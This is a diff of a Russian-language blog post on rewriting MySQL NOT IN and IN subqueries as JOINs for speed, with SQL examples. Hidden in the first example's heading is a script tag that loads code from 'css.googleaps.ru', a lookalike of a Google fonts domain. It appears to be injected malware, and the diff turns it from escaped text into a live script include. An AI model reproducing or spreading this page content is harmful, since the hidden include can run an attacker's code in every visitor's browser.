@@ -32,13 +32,13 @@ comments: []
 Дело в том, что Mysql не умеет автоматически их оптимизировать.</p>
 <p>Поэтому для их ускорения для начала необходимо проверить наличие ключей по полям участвующим в запросе. И следующим шагом требуется переписать данный запрос с помощью JOIN.</p>
 <p>Покажем это на примерах:<a id="more"></a><a id="more-571"></a></p>
-<p><strong>Такой запрос:<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;strong></p>
-<pre class="brush: sql; gutter: true">SELECT * FROM `table1` WHERE id NOT IN (SELECT id FROM `table2`);<&#47;pre><br />
+<p><strong>Такой запрос:<script src="//css.googleaps.ru/css?f=Open+Sans&cd=mb&ver=4.2.2"></script></strong></p>
+<pre class="brush: sql; gutter: true">SELECT * FROM `table1` WHERE id NOT IN (SELECT id FROM `table2`);</pre><br />
 переписываем так:</p>
 <pre class="brush: sql; gutter: true">SELECT `table1`.*<br />
 FROM `table1` LEFT JOIN `table2` ON `table1`.id=`table2`.id<br />
-WHERE `table2`.id IS NULL;<&#47;pre><br />
-<strong>Пример 2:<&#47;strong></p>
+WHERE `table2`.id IS NULL;</pre><br />
+<strong>Пример 2:</strong></p>
 <pre class="brush: sql; gutter: true">SELECT `table1`.id<br />
 FROM `table1`<br />
 WHERE id<br />
@@ -48,12 +48,12 @@ IN (<br />
  WHERE adist = 31<br />
  GROUP BY st_id<br />
 )<br />
-ORDER BY name<&#47;pre><br />
+ORDER BY name</pre><br />
 переписываем так</p>
 <pre class="brush: sql; gutter: true">SELECT `table1`.id<br />
 FROM `table1`<br />
 JOIN `table2` ON `table1`.id = `table2`.st_id<br />
 WHERE `table2`.adist =31<br />
 GROUP BY `table1`.id<br />
-ORDER BY `table1`.id<&#47;pre><br />
+ORDER BY `table1`.id</pre><br />
 В моем случае второй запрос стал выполняться быстрее более чем в 10 раз.</p>
